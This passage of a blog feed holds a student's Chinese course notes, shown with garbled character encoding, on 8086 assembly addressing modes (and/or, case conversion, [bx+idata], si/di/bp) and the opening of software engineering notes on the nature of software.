è½½å…¥å†…å­˜åï¼ŒCPUçš„CS:IPè¢«è®¾ç½®æŒ‡å‘è¿™ä¸ªå…¥å£ï¼Œä»è€Œå¼€å§‹æ‰§è¡Œç¨‹åºä¸­çš„ç¬¬ä¸€æ¡æŒ‡ä»¤</span><br></pre></td></tr></table></figure><h1 id="æ›´çµæ´»çš„å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•"><a href="#æ›´çµæ´»çš„å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•" class="headerlink" title="æ›´çµæ´»çš„å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•"></a>æ›´çµæ´»çš„å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•</h1><p>å‰é¢ï¼Œæˆ‘ä»¬ç”¨[0]ã€[bx]çš„æ–¹æ³•ï¼Œåœ¨è®¿é—®å†…å­˜çš„æŒ‡ä»¤ä¸­ï¼Œå®šä½å†…å­˜å•å…ƒçš„åœ°å€ã€‚æœ¬ç« æˆ‘ä»¬ä¸»è¦é€šè¿‡å…·ä½“çš„é—®é¢˜æ¥è®²è§£ä¸€äº›æ›´çµæ´»çš„å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•å’Œç›¸å…³çš„ç¼–ç¨‹æ–¹æ³•ã€‚</p><h3 id="Andå’ŒOræŒ‡ä»¤"><a href="#Andå’ŒOræŒ‡ä»¤" class="headerlink" title="Andå’ŒOræŒ‡ä»¤"></a>Andå’ŒOræŒ‡ä»¤</h3><h4 id="Andï¼šé€»è¾‘ä¸ï¼ŒæŒ‰ä½è¿›è¡Œä¸è¿ç®—"><a href="#Andï¼šé€»è¾‘ä¸ï¼ŒæŒ‰ä½è¿›è¡Œä¸è¿ç®—" class="headerlink" title="Andï¼šé€»è¾‘ä¸ï¼ŒæŒ‰ä½è¿›è¡Œä¸è¿ç®—"></a>Andï¼šé€»è¾‘ä¸ï¼ŒæŒ‰ä½è¿›è¡Œä¸è¿ç®—</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">and al,00111011B</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåï¼Œal&#x3D;00100011B</p><h4 id="Orï¼šé€»è¾‘æˆ–ï¼ŒæŒ‰ä½è¿›è¡Œæˆ–è¿ç®—"><a href="#Orï¼šé€»è¾‘æˆ–ï¼ŒæŒ‰ä½è¿›è¡Œæˆ–è¿ç®—" class="headerlink" title="Orï¼šé€»è¾‘æˆ–ï¼ŒæŒ‰ä½è¿›è¡Œæˆ–è¿ç®—"></a>Orï¼šé€»è¾‘æˆ–ï¼ŒæŒ‰ä½è¿›è¡Œæˆ–è¿ç®—</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov al,01100011B</span><br><span class="line">or  al,00111011B</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåï¼Œal&#x3D;01111011B</p><h4 id="åº”ç”¨ï¼šå¤§å°å†™è½¬æ¢"><a href="#åº”ç”¨ï¼šå¤§å°å†™è½¬æ¢" class="headerlink" title="åº”ç”¨ï¼šå¤§å°å†™è½¬æ¢"></a>åº”ç”¨ï¼šå¤§å°å†™è½¬æ¢</h4><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/20190321194022547.png" alt="20190321194022547" style="zoom: 80%;" /><p>å°å†™å­—æ¯çš„ASCIIç å€¼æ¯”å¤§å†™å­—æ¯çš„ASCIIç å€¼å¤§20H</p><p>å¤§å†™å­—æ¯ASCIIç çš„ç¬¬5ä½ä¸º0ï¼Œå°å†™å­—æ¯çš„ç¬¬5ä½ä¸º1(å…¶ä»–ä¸€è‡´)</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg </span><br><span class="line"></span><br><span class="line">datasg segment </span><br><span class="line">db &#x27;BaSiC&#x27;</span><br><span class="line">db &#x27;iNfOrMaTion&#x27;</span><br><span class="line">datasg end</span><br><span class="line"> </span><br><span class="line">codesg segment </span><br><span class="line">start:mov ax, datasg </span><br><span class="line">mov ds, ax;è®¾ç½®ds æŒ‡å‘ datasgæ®µ</span><br><span class="line"></span><br><span class="line">mov bx, 0;è®¾ç½®ï¼ˆbxï¼‰=0ï¼Œds:bxæŒ‡å‘â€™BaSicâ€™çš„ç¬¬ä¸€ä¸ªå­—æ¯</span><br><span class="line"></span><br><span class="line">mov cx, 5      ;è®¾ç½®å¾ªç¯æ¬¡æ•°5ï¼Œå› ä¸ºâ€™Basic&#x27;æœ‰5ä¸ªå­—æ¯</span><br><span class="line">s:mov al, [bx]     ;å°†ASCIIç ä»ds:bxæ‰€æŒ‡å‘çš„å•å…ƒä¸­å–å‡º</span><br><span class="line">and al, 11011111B;å°†alä¸­çš„ASCIIç çš„ç¬¬5ä½ç½®ä¸º0ï¼Œå˜ä¸ºå¤§å†™å­—æ¯</span><br><span class="line">mov [bx], al ;å°†è½¬å˜åçš„ASCIIç å†™å›åŸå•å…ƒ</span><br><span class="line">inc bx     ;ï¼ˆbxï¼‰åŠ 1ï¼Œds:bxæŒ‡å‘ä¸‹ä¸€ä¸ªå­—æ¯</span><br><span class="line">loop s </span><br><span class="line"></span><br><span class="line">mov bx, 5;è®¾ç½®ï¼ˆbxï¼‰=5ï¼Œds:bxæŒ‡å‘ï¼ŒiNfOrMaTion&#x27;çš„ç¬¬ä¸€ä¸ªå­—æ¯</span><br><span class="line"></span><br><span class="line">mov cx, 11;è®¾ç½®å¾ªç¯æ¬¡æ•°11ï¼Œå› ä¸ºâ€˜iNfOrMaTion&#x27;æœ‰11ä¸ªå­—æ¯</span><br><span class="line">s0:mov al, [bx]</span><br><span class="line">or al, 00100000B;å°†a1ä¸­çš„ASCIIç çš„ç¬¬5ä½ç½®ä¸º1ï¼Œå˜ä¸ºå°å†™å­—æ¯</span><br><span class="line">mov [bx], al </span><br><span class="line">inc bx</span><br><span class="line">loop s0</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h </span><br><span class="line">int 21h </span><br><span class="line">codesg ends</span><br></pre></td></tr></table></figure><h3 id="bx-idata"><a href="#bx-idata" class="headerlink" title="[bx+idata]"></a>[bx+idata]</h3><p>å‰é¢ï¼Œæˆ‘ä»¬ç”¨[bx]çš„æ–¹å¼æ¥æŒ‡æ˜ä¸€ä¸ªå†…å­˜å•å…ƒï¼Œè¿˜å¯ä»¥ç”¨ä¸€ç§æ›´ä¸ºçµæ´»çš„æ–¹å¼æ¥æŒ‡æ˜å†…å­˜å•å…ƒï¼›[bx+idata]è¡¨ç¤ºä¸€ä¸ªå†…å­˜å•å…ƒï¼Œå®ƒçš„åç§»åœ°å€ä¸º(bx)+idata(bxä¸­çš„æ•°å€¼åŠ ä¸Šidata)</p><p><code>mov ax,[bx+200]</code></p><p>å«ä¹‰ï¼šå°†ä¸€ä¸ªå†…å­˜å•å…ƒçš„å†…å®¹é€å…¥axï¼Œè¿™ä¸ªå†…å­˜å•å…ƒçš„é•¿åº¦ä¸º2ä¸ªè‡ªå·±(å­—å•å…ƒ)ï¼Œå­˜æ”¾ä¸€ä¸ªå­—ï¼Œåç§»åœ°å€ä¸ºbxæ€»çš„æ•°å€¼åŠ ä¸Š200ï¼Œæ®µåœ°å€åœ¨dsä¸­ã€‚</p><p>ä»¥ä¸‹å†™æ³•ä¹Ÿå¾ˆå¸¸è§ï¼š</p><p><code>mov ax,[200+bx]</code></p><p><code>mov ax,200[bx]</code></p><p><code>mov ax,[bx].200</code></p><p>è¿™ä¸ªå¯ä»¥ç†è§£ä¸ºæ•°ç»„ï¼Œæˆ‘ä»¬åˆ©ç”¨è¿™ä¸ªå¯ä»¥ç”¨æ›´é«˜çº§çš„ç»“æ„æ¥å®ç°å¤§å°å†™è½¬æ¢ç¨‹åº</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">assume cs:codesg,ds:datasg </span><br><span class="line"></span><br><span class="line">datasg segment </span><br><span class="line">db &#x27;BaSiC&#x27;;è½¬ä¸ºå¤§å†™</span><br><span class="line">db &#x27;MinIx&#x27;;è½¬ä¸ºå°å†™</span><br><span class="line">datasg ends</span><br><span class="line"></span><br><span class="line">codesg segment</span><br><span class="line">start:</span><br><span class="line">mov ax, datasg </span><br><span class="line">mov ds, ax </span><br><span class="line">mov bx, 0  ;åˆå§‹ds:bx</span><br><span class="line"></span><br><span class="line">mov cx, 5</span><br><span class="line">s:mov al, 0[bx]  </span><br><span class="line">and al, 11011111b ;è½¬ä¸ºå¤§å†™å­—æ¯</span><br><span class="line">mov 0[bx], al ;å†™å›</span><br><span class="line">mov al, 5[bx]  ;[5 + bx]</span><br><span class="line">or al, 00100000b ;è½¬ä¸ºå°å†™å­—æ¯</span><br><span class="line">mov 5[bx], al </span><br><span class="line">inc bx</span><br><span class="line">loop s</span><br><span class="line"></span><br><span class="line">mov ax, 4c00h </span><br><span class="line">int 21h</span><br><span class="line">codesg ends</span><br><span class="line">end start</span><br></pre></td></tr></table></figure><p>å¯¹æ¯”ä»¥ä¸‹æ±‡ç¼–å’ŒCè¯­è¨€å¯¹æ•°ç»„çš„å†™æ³•</p><p>Cè¯­è¨€:  <code>a[i], b[i]</code></p><p>æ±‡ç¼–:   <code>0[bx], 5[bx]</code></p><h3 id="SIå’ŒDI"><a href="#SIå’ŒDI" class="headerlink" title="SIå’ŒDI"></a>SIå’ŒDI</h3><p>siå’Œdiæ˜¯8086CPUä¸­å’ŒbxåŠŸèƒ½ç›¸è¿‘çš„å¯„å­˜å™¨ï¼Œsiå’Œdiä¸èƒ½å¤Ÿåˆ†æˆä¸¤ä¸ª8ä½å¯„å­˜å™¨æ¥ä½¿ç”¨ã€‚ä¸‹é¢çš„3ç»„æŒ‡ä»¤å®ç°äº†ç›¸åŒçš„åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov bx,0</span><br><span class="line">mov ax,[bx]</span><br><span class="line"></span><br><span class="line">mov si,0</span><br><span class="line">mov ax,[bx]</span><br><span class="line"></span><br><span class="line">mov di,0</span><br><span class="line">mov ax,[bx]</span><br></pre></td></tr></table></figure><p>ä¸‹é¢çš„ä¸‰ç»„æŒ‡ä»¤ä¹Ÿå®ç°äº†ç›¸åŒçš„åŠŸèƒ½</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mov bx,0</span><br><span class="line">mov ax,[bx+123]</span><br><span class="line"></span><br><span class="line">mov si,0</span><br><span class="line">mov ax,[si+123]</span><br><span class="line"></span><br><span class="line">mov di,0</span><br><span class="line">mov ax,[di+123]</span><br></pre></td></tr></table></figure><h3 id="ä¸åŒå¯»å€æ–¹å¼çš„çµæ´»åº”ç”¨"><a href="#ä¸åŒå¯»å€æ–¹å¼çš„çµæ´»åº”ç”¨" class="headerlink" title="ä¸åŒå¯»å€æ–¹å¼çš„çµæ´»åº”ç”¨"></a>ä¸åŒå¯»å€æ–¹å¼çš„çµæ´»åº”ç”¨</h3><p>å¦‚æœæˆ‘ä»¬æ¯”è¾ƒå‰é¢æåˆ°äº†å‡ ç§å®šä½å†…å­˜åœ°å€çš„æ–¹æ³•(å¯ç§°ä¸ºå¯»å€æ–¹å¼)ï¼Œå°±å¯ä»¥å‘ç°</p><ul><li>[idata]ç”¨ä¸€ä¸ªå¸¸é‡è¡¨ç¤ºåœ°å€ï¼Œå¯ç”¨äºç›´æ¥å®šä½ä¸€ä¸ªå†…å­˜å•å…ƒ</li><li>[bx]ç”¨ä¸€ä¸ªå˜é‡æ¥è¡¨ç¤ºå†…å­˜åœ°å€ï¼Œå¯ç”¨äºé—´æ¥å®šä½ä¸€ä¸ªå†…å­˜å•å…ƒ</li><li>[bx+idata]ç”¨ä¸€ä¸ªå˜é‡å’Œå¸¸é‡è¡¨ç¤ºåœ°å€ï¼Œå¯åœ¨ä¸€ä¸ªèµ·å§‹åœ°å€çš„åŸºç¡€ä¸Šç”¨å˜é‡é—´æ¥å®šä½ä¸€ä¸ªå†…å­˜å•å…ƒ</li><li>[bx+si]ç”¨ä¸¤ä¸ªå˜é‡è¡¨ç¤ºåœ°å€</li><li>[bx+si+idata]ç”¨ä¸¤ä¸ªå˜é‡å’Œä¸€ä¸ªå¸¸é‡è¡¨ç¤ºåœ°å€</li></ul><p>ä¸€èˆ¬æ¥è¯´ï¼Œåœ¨éœ€è¦æš‚å­˜æ•°æ®çš„æ—¶å€™ï¼Œæˆ‘ä»¬éƒ½åº”è¯¥ä½¿ç”¨æ ˆã€‚</p><h1 id="æ•°æ®å¤„ç†çš„ä¸¤ä¸ªåŸºæœ¬é—®é¢˜"><a href="#æ•°æ®å¤„ç†çš„ä¸¤ä¸ªåŸºæœ¬é—®é¢˜" class="headerlink" title="æ•°æ®å¤„ç†çš„ä¸¤ä¸ªåŸºæœ¬é—®é¢˜"></a>æ•°æ®å¤„ç†çš„ä¸¤ä¸ªåŸºæœ¬é—®é¢˜</h1><p>æˆ‘ä»¬çŸ¥é“ï¼Œè®¡ç®—æœºæ˜¯å°½å¿ƒæ•°æ®å¤„ç†ã€è¿ç®—çš„æœºå™¨ã€‚é‚£ä¹ˆæœ‰ä¸¤ä¸ªåŸºæœ¬çš„é—®é¢˜å°±åŒ…å«åœ¨å…¶ä¸­ï¼š</p><ul><li>å¤„ç†çš„æ•°æ®åœ¨ä»€ä¹ˆåœ°æ–¹</li><li>è¦å¤„ç†çš„æ•°æ®æœ‰å¤šé•¿</li></ul><p>è¿™ä¸¤ä¸ªé—®é¢˜ï¼Œåœ¨æœºå™¨æŒ‡ä»¤ä¸­å¿…é¡»ç»™ä»¥æ˜ç¡®æˆ–éšå«çš„è¯´æ˜ï¼Œå¦åˆ™è®¡ç®—æœºå°±æ— æ³•å·¥ä½œã€‚</p><p>æˆ‘ä»¬å®šä¹‰çš„æè¿°æ€§ç¬¦å·ï¼š<code>reg</code>å’Œ<code>sreg</code></p><p>ä¸ºäº†æè¿°ä¸Šçš„ç®€æ´ï¼Œåœ¨ä»¥åçš„è¯¾ç¨‹ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨æè¿°æ€§çš„ç¬¦å·<code>reg</code>æ¥è¡¨ç¤ºä¸€ä¸ªå¯„å­˜å™¨ï¼Œç”¨<code>sreg</code>è¡¨ç¤ºä¸€ä¸ªæ®µå¯„å­˜å™¨</p><p><code>reg</code> çš„é›†åˆåŒ…æ‹¬ï¼šaxã€bxã€cxã€dxã€ahã€alã€bhã€blã€chã€clã€dhã€dlã€spã€bpã€siã€di</p><p><code>sreg</code>çš„é›†åˆåŒ…æ‹¬ï¼šdsã€ssã€csã€es</p><h3 id="bxã€siã€diå’Œbp"><a href="#bxã€siã€diå’Œbp" class="headerlink" title="bxã€siã€diå’Œbp"></a>bxã€siã€diå’Œbp</h3><p>æˆ‘ä»¬è¿›è¡Œä¸€ä¸‹æ€»ç»“ï¼š</p><ul><li><p>åœ¨8086CPUä¸­ï¼Œåªæœ‰è¿™4ä¸ªå¯„å­˜å™¨å¯ä»¥åœ¨[Â·Â·Â·]ä¸­æ¥è¿›è¡Œå†…å­˜å•å…ƒçš„å¯»å€</p></li><li><p>åœ¨[Â·Â·Â·]ä¸­ï¼Œè¿™4ä¸ªå¯„å­˜å™¨å¯ä»¥å•ä¸ªå®ç°ï¼Œæˆ–åªèƒ½ä»¥4ä¸­ç»„åˆå‡ºç°ï¼š<code>bxå’Œsi</code>ã€<code>bxå’Œdi</code>ã€<code>bpå’Œsi</code>ã€<code>bpå’Œdi</code>ã€‚</p></li><li><p>åªè¦åœ¨[Â·Â·Â·]ä¸­ä½¿ç”¨å¯„å­˜å™¨bpï¼Œè€ŒæŒ‡ä»¤ä¸­æ²¡æœ‰æ˜¾æ€§åœ°ç»™å‡ºæ®µåœ°å€, æ®µåœ°å€å°±é»˜è®¤åœ¨ssä¸­</p><p><code>mov ax,[bp]</code>  å«ä¹‰   <code>(ax)=((ss)*16+(bp))</code></p></li></ul><h3 id="æ±‡ç¼–ä¸­æ•°æ®ä½ç½®çš„è¡¨è¾¾"><a href="#æ±‡ç¼–ä¸­æ•°æ®ä½ç½®çš„è¡¨è¾¾" class="headerlink" title="æ±‡ç¼–ä¸­æ•°æ®ä½ç½®çš„è¡¨è¾¾"></a>æ±‡ç¼–ä¸­æ•°æ®ä½ç½®çš„è¡¨è¾¾</h3><p>æ±‡ç¼–è¯­è¨€ä¸­ç”¨3ä¸ªæ¦‚å¿µæ¥è¡¨è¾¾æ•°æ®çš„ä½ç½®</p><ul><li>ç«‹å³æ•°(idata)</li><li>å¯„å­˜å™¨</li><li>æ®µåœ°å€(SA)å’Œåç§»åœ°å€(EA)</li></ul><h4 id="ç«‹å³æ•°-idata"><a href="#ç«‹å³æ•°-idata" class="headerlink" title="ç«‹å³æ•°(idata)"></a>ç«‹å³æ•°(idata)</h4><p>å¯¹äºç›´æ¥åŒ…å«åœ¨æœºå™¨æŒ‡ä»¤ä¸­çš„æ•°æ®(æ‰§è¡Œå‰åœ¨CPUæ˜¯ç›´æ¥æŒ‡ä»¤ç¼“å†²å™¨ä¸­)ï¼Œåœ¨æ±‡ç¼–è¯­è¨€ä¸­ç§°ä¸ºï¼šç«‹å³æ•°(idata)ï¼Œåœ¨æ±‡ç¼–æŒ‡ä»¤ä¸­ç›´æ¥ç»™å‡ºã€‚ä¾‹å¦‚:</p><p><code>mov ax,1</code></p><h4 id="å¯„å­˜å™¨-1"><a href="#å¯„å­˜å™¨-1" class="headerlink" title="å¯„å­˜å™¨"></a>å¯„å­˜å™¨</h4><p>æŒ‡ä»¤è¦å¤„ç†çš„æ•°æ®åœ¨å¯„å­˜å™¨ä¸­ï¼Œåœ¨æ±‡ç¼–æŒ‡ä»¤ä¸­ç»™å‡ºç›¸åº”çš„å¯„å­˜å™¨åã€‚ä¾‹å¦‚ï¼š</p><p><code>mov ax,bx</code></p><h4 id="æ®µåœ°å€ï¼ˆSAï¼‰å’Œåç§»åœ°å€ï¼ˆEAï¼‰"><a href="#æ®µåœ°å€ï¼ˆSAï¼‰å’Œåç§»åœ°å€ï¼ˆEAï¼‰" class="headerlink" title="æ®µåœ°å€ï¼ˆSAï¼‰å’Œåç§»åœ°å€ï¼ˆEAï¼‰"></a>æ®µåœ°å€ï¼ˆSAï¼‰å’Œåç§»åœ°å€ï¼ˆEAï¼‰</h4><p>æŒ‡ä»¤è¦å¤„ç†çš„æ•°æ®åœ¨å†…å­˜ä¸­ï¼Œåœ¨æ±‡ç¼–æŒ‡ä»¤ä¸­å¯ç”¨[X]çš„æ ¼å¼ç»™å‡ºEAï¼ŒSAåœ¨æŸä¸ªæ®µå¯„å­˜å™¨ä¸­ã€‚</p><ul><li>å­˜æ”¾åœ¨æ®µåœ°å€çš„å¯„å­˜å™¨å¯ä»¥æ˜¯é»˜è®¤çš„</li><li>å­˜æ”¾åœ¨æ®µåœ°å€çš„å¯„å­˜å™¨ä¹Ÿå¯ä»¥æ˜¯æ˜¾æ€§ç»™å‡ºçš„</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">mov ax, [0]</span><br><span class="line">mov ax, [di]</span><br><span class="line">mov ax, [bx+8]</span><br><span class="line">mov ax, [bx+si]</span><br><span class="line">mov ax, [bx+si+8]   ;ä»¥ä¸Šæ®µåœ°å€é»˜è®¤åœ¨dsä¸­</span><br><span class="line"></span><br><span class="line">mov ax, [bp]</span><br><span class="line">mov ax, [bp+8]</span><br><span class="line">mov ax, [bp+si]</span><br><span class="line">mov ax, [bp+si+8]   ;ä»¥ä¸Šæ®µåœ°å€é»˜è®¤åœ¨ssä¸­</span><br><span class="line"></span><br><span class="line">mov ax, ds:[bp]</span><br><span class="line">mov ax, es:[bx]</span><br><span class="line">mov ax, ss:[bx+si]</span><br><span class="line">mov ax, cs:[bx+si+8] ;æ˜¾å¼ç»™å‡ºå­˜æ”¾æ®µåœ°å€çš„å¯„å­˜å™¨</span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240115220506695.png" alt="image-20240115220506695" style="zoom:50%;" />]]></content>
      
      
      <categories>
          
          <category> è¯¾å†… </category>
          
      </categories>
      
      
        <tags>
            
            <tag> è¯¾å†… </tag>
            
            <tag> æ±‡ç¼– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è½¯ä»¶å·¥ç¨‹</title>
      <link href="/2024/01/10/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/"/>
      <url>/2024/01/10/%E8%BD%AF%E4%BB%B6%E5%B7%A5%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="è½¯ä»¶çš„æœ¬è´¨"><a href="#è½¯ä»¶çš„æœ¬è´¨" class="headerlink" title="è½¯ä»¶çš„æœ¬è´¨"></a>è½¯ä»¶çš„æœ¬è´¨</h1><h2 id="è½¯ä»¶çš„æœ¬è´¨-1"><a href="#è½¯ä»¶çš„æœ¬è´¨-1" class="headerlink" title="è½¯ä»¶çš„æœ¬è´¨"></a>è½¯ä»¶çš„æœ¬è´¨</h2><p>ç°åœ¨çš„è½¯ä»¶å…·æœ‰<strong>äº§å“</strong>å’Œ<strong>äº§å“äº¤ä»˜è½½ä½“</strong>çš„åŒé‡ä½œç”¨ã€‚</p><ul><li>ä½œä¸ºäº§å“ï¼Œè½¯ä»¶æ˜¾ç¤ºäº†ç”±è®¡ç®—æœºç¡¬ä»¶ä½“ç°çš„è®¡ç®—èƒ½åŠ›ï¼Œæˆ–è€…è¯´æ˜¾ç¤ºçš„æ˜¯ç”±ä¸€ä¸ªå¯è¢«æœ¬åœ°ç¡¬ä»¶è®¾å¤‡è®¿é—®çš„è®¡ç®—æœºç½‘ç»œä½“ç°çš„è®¡ç®—æ½œåŠ›ã€‚è½¯ä»¶æ‰®æ¼”ç€ä¿¡æ¯è½¬æ¢çš„è§’è‰²ï¼›äº§ç”Ÿã€ç®¡ç†ã€è·å–ã€ä¿®æ”¹ã€æ˜¾ç¤ºæˆ–è€…ä¼ è¾“å„ç§ä¸åŒçš„ä¿¡æ¯</li><li>ä½œä¸ºäº§å“ç”Ÿäº§çš„è½½ä½“ï¼Œè½¯ä»¶æä¾›äº†è®¡ç®—æœºæ§åˆ¶(æ“ä½œç³»ç»Ÿ)ã€ä¿¡æ¯é€šä¿¡(ç½‘ç»œ)ã€ä»¥åŠåº”ç”¨ç¨‹åºå¼€å‘å’Œæ§åˆ¶(è½¯ä»¶å·¥ä½œå’Œç¯å¢ƒ)çš„åŸºç¡€å¹³å°</li></ul><p>è½¯ä»¶æä¾›äº†æˆ‘ä»¬è¿™ä¸ªæ—¶ä»£æœ€é‡è¦çš„äº§å“â€”â€”ä¿¡æ¯ã€‚</p><h3 id="è½¯ä»¶çš„å®šä¹‰"><a href="#è½¯ä»¶çš„å®šä¹‰" class="headerlink" title="è½¯ä»¶çš„å®šä¹‰"></a>è½¯ä»¶çš„å®šä¹‰</h3><p>æ¥è‡ªæ•™ç§‘ä¹¦çš„å…³äºè½¯ä»¶çš„å®šä¹‰ä¹Ÿè®¸æ˜¯ï¼š</p><p>è½¯ä»¶æ˜¯</p><ul><li><strong>æŒ‡ä»¤çš„é›†åˆ</strong>(è®¡ç®—æœºç¨‹åº)ï¼Œé€šè¿‡æ‰§è¡Œè¿™äº›æŒ‡ä»¤å¯ä»¥æ»¡è¶³é¢„æœŸçš„ç‰¹æ€§ã€åŠŸèƒ½å’Œæ€§èƒ½éœ€æ±‚</li><li><strong>æ•°æ®ç»“æ„</strong>ï¼Œä½¿å¾—ç¨‹åºå¯ä»¥åˆç†åˆ©ç”¨ä¿¡æ¯</li><li><strong>è½¯ä»¶æè¿°ä¿¡æ¯</strong>ï¼Œå®ƒä»¥ç¡¬æ‹·è´å’Œè™šæ‹Ÿå½¢å¼å­˜åœ¨ï¼Œç”¨æ¥æè¿°ç¨‹åºçš„æ“ä½œå’Œä½¿ç”¨</li></ul><blockquote><p>&#x3D;&#x3D;è½¯ä»¶&#x3D;ç¨‹åº+æ•°æ®+æ–‡æ¡£&#x3D;&#x3D;</p></blockquote><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20240103164602925.png" alt="image-20240103164602925" style="zoom:33%;" /><blockquote><p>è½¯ä»¶ä¸ä¼šç£¨æŸï¼Œä½†æ˜¯è½¯ä»¶é€€åŒ–çš„ç¡®å­˜åœ¨ã€‚</p></blockquote><p>åœ¨å®Œæ•´ç”Ÿå‘½å‘¨æœŸé‡Œï¼Œè½¯ä»¶å°†ä¼šé¢ä¸´å˜æ›´ï¼Œæ¯æ¬¡å˜æ›´éƒ½å¯èƒ½å¼•å…¥æ–°çš„é”™è¯¯ã€‚å¯ä»¥è¯´ï¼Œ<strong>ä¸æ–­çš„å˜æ›´æ˜¯è½¯ä»¶é€€åŒ–çš„æ ¹æœ¬åŸå› ã€‚</strong></p><h3 id="è½¯ä»¶åº”ç”¨é¢†åŸŸ"><a href="#è½¯ä»¶åº”ç”¨é¢†åŸŸ" class="headerlink" title="è½¯ä»¶åº”ç”¨é¢†åŸŸ"></a>è½¯ä»¶åº”ç”¨é¢†åŸŸ</h3><p>ä»Šå¤©ï¼Œè®¡ç®—æœºè½¯ä»¶å¯åˆ†ä¸ºä¸ƒå¤§ç±»</p><ul><li><strong>ç³»ç»Ÿè½¯ä»¶</strong>â€”â€”æ•´å¥—æœåŠ¡äºå…¶ä»–ç¨‹åºçš„ç¨‹åº</li><li><strong>åº”ç”¨è½¯ä»¶</strong>â€”â€”è§£å†³ç‰¹å®šéä¸šåŠ¡éœ€è¦çš„ç‹¬ç«‹åº”ç”¨ç¨‹åº</li><li><strong>å·¥ç¨‹&#x2F;ç§‘å­¦è½¯ä»¶</strong>â€”â€”â€œæ•°å€¼è®¡ç®—â€ç±»ç¨‹åºæ¶µç›–äº†å¹¿æ³›çš„åº”ç”¨é¢†åŸŸ</li><li><strong>åµŒå…¥å¼è½¯ä»¶</strong>â€”â€”å­˜åœ¨äºæŸä¸ªäº§å“æˆ–è€…ç³»ç»Ÿä¸­ï¼Œå¯å®ç°å’Œæ§åˆ¶é¢å‘æœ€ç»ˆç”¨æˆ·å’Œç³»ç»Ÿæœ¬èº«çš„ç‰¹æ€§å’ŒåŠŸèƒ½</li><li><strong>äº§å“çº¿è½¯ä»¶</strong>â€”â€”ä¸ºå¤šä¸ªä¸åŒç”¨æˆ·çš„ä½¿ç”¨æä¾›ç‰¹å®šåŠŸèƒ½</li><li><strong>Web&#x2F;ç§»åŠ¨APP</strong>â€”â€”ä»¥ç½‘ç»œä¸ºä¸­å¿ƒï¼Œå…¶æ¦‚å¿µæ¶µç›–äº†å®½æ³›çš„åº”ç”¨è½¯ä»¶äº§å“</li><li><strong>äººå·¥æ™ºèƒ½è½¯ä»¶</strong>â€”â€”åˆ©ç”¨éæ•°å€¼è®¡ç®—ç®—æ³•è§£å†³è®¡ç®—å’Œç›´æ¥åˆ†ææ— æ³•è§£å†³çš„å¤æ‚é—®é¢˜</li></ul><p>ç°åœ¨äººä»¬è®¤ä¸ºï¼šåœ¨ä¿¡æ¯äº§ä¸šä¸­ï¼Œ<strong>å¾®ç”µå­æ˜¯åŸºç¡€ï¼Œè®¡ç®—æœºå’Œç½‘ç»œæ˜¯è½½ä½“ï¼Œè½¯ä»¶æ˜¯æ ¸å¿ƒ</strong>ã€‚</p><h2 id="è½¯ä»¶çš„å˜æ›´æœ¬è´¨"><a 